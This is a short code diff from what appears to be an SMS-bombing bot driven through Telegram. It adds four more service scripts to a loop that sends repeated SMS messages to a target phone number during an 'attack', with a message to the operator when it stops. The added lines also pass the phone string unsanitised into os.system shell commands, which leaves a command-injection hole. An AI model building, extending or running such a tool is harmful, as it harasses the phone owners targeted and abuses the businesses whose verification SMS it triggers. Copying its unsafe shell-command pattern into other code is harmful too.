@@ -74,6 +74,20 @@ def run_sms(phone, userid):
 
         time.sleep(int(utilities.get_sms_timesleep()))
 
+        os.system("python3 services/askona.py " + phone)
+
+        time.sleep(int(utilities.get_sms_timesleep()))
+
+        os.system("python3 services/modulbank.py " + phone[1:-1])
+
+        time.sleep(int(utilities.get_sms_timesleep()))
+
+        os.system("python3 services/technopark.py " + phone[1:-1])
+
+        time.sleep(int(utilities.get_sms_timesleep()))
+
+        os.system("python3 services/vernyi.py " + phone)
+
         if not utilities.is_attack_running(userid):
             bot = telebot.TeleBot(config.bot_token)
             bot.send_message(userid, "СМС остановлены!")
